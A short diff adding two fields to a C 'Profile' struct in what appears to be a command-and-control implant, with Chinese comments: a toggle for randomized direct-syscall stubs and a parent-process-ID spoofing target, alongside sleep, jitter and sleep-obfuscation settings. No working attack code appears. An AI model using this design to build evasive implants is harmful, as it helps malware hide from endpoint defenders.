@@ -96,6 +96,8 @@ typedef struct Profile {
     INT sleep_ms;               /* 基础睡眠时间（ms） */
     INT jitter;                 /* 抖动百分比（0-100） */
     INT conn_timeout_sec;       /* 连接超时（秒） */
+    BOOL syscall_enabled;       /* 是否启用 syscall（绑定槽位走 randomized stub；FALSE = 普通 ntdll 地址） */
+    CHAR spawn_ppid[64];        /* PPID 欺骗目标：进程名（explorer.exe）或数字 PID；空 = 不欺骗 */
     BOOL sleep_obf_enabled;     /* 是否启用睡眠混淆 */
     SleepObfTechnique sleep_obf_technique; /* 混淆技术选择 */
     SleepObfImageLayout sleep_layout; /* 预计算映像布局 */
